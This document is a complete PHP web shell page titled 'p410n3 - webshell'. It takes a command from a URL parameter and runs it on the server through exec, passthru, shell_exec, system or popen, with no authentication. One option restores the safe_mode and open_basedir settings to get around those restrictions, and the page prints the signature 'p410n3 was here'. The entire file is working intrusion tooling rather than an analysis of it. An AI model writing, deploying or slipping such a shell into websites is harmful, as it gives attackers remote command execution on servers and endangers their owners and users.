<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>p410n3 - webshell</title>
    <style>
        body {
            font-family: Consolas;
            background-color: #f6f8fa;
        }

        .container {
            margin: 30px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .form form {
            margin-top: 50px;

            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-end;
        }

        @media (min-width: 768px) {
            .form form {
                flex-direction: row;
            }
        }

        .form * {
            margin: 5px;
        }

        .form label {
            font-size: 24px;
        }

        .form input,
        .form select {
            height: 30px;
            width: 100%;
            border-radius: 3px;
            padding-left: 5px;

            border: 1px solid grey;

            box-sizing: border-box;
        }

        .form button {
            height: 30px;
            padding: 5px 15px;
            color: white;
            background-color: black;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }

        .form button {
            align-self: flex-end;
        }

        .code {
            margin-top: 30px;
            background-color: black;
            color: limegreen;
            padding: 10px;
            border-radius: 5px;
            font-size: 15px;

            width: 800px;
            max-width: 90vw;
        }

        .code pre {
            white-space: pre-line;
            word-wrap: break-word;
        }
    </style>

</head>
<body>
    <div class="container">
        <div class="form">
            <form action="<?php $_SERVER['SCRIPT_FILENAME'] ?>" method="get">
                <label for="executioner">Command: </label>
                <select name="executioner" id="executioner">
                    <option value="exec">exec</option>
                    <option value="passthru">passthru</option>
                    <option value="shell_exec">shell_exec</option>
                    <option value="system">system</option>
                    <option value="popen">popen (live!)</option>
                    <option value="shell_exec_bypass">shell_exec // safe_mode bypass</option>
                </select>

                <input type="text" name="cmd" placeholder="cmd" id="cmd">
                <button type="submit">RUN</button>
            </form>
        </div>
        <div class="code">
            <pre>
            <?php
                if (isset($_GET["executioner"]) && isset($_GET["cmd"])) {
                    $exec = $_GET["executioner"];
                    $cmd = $_GET["cmd"];

                    switch ($exec) {
                        case "exec":
                            echo exec($cmd);
                            break;

                        case "passthru":
                            passthru($cmd);
                            break;

                        case "shell_exec":
                            echo shell_exec($cmd);
                            break;

                        case "system":
                            system($cmd);
                            break;

                        case "popen":
                            $proc = popen($_POST['popen_cmd'], 'r');
                            while (!feof($proc)) {
                                echo fread($proc, 4096);
                                @ flush();
                            }
                            pclose($proc);
                            break;

                        case "shell_exec_bypass":
                            ini_restore("safe_mode");
                            ini_restore("open_basedir");
                            echo shell_exec($cmd);
                            break;
                    }

                } else {
                    echo('p410n3 was here');
                }
            ?>
            </pre>
        </div>
    </div>
    <script>
        //detects the cuurent executioner GET parameter by
        // splitting some stuff from window.location.search
        var curExecutioner = window.location.search.substr(1).split("&")[0].split("=")[1];

        if (curExecutioner != undefined) {
            document.getElementById("executioner").value = curExecutioner;
        }
    </script>
</body>
</html>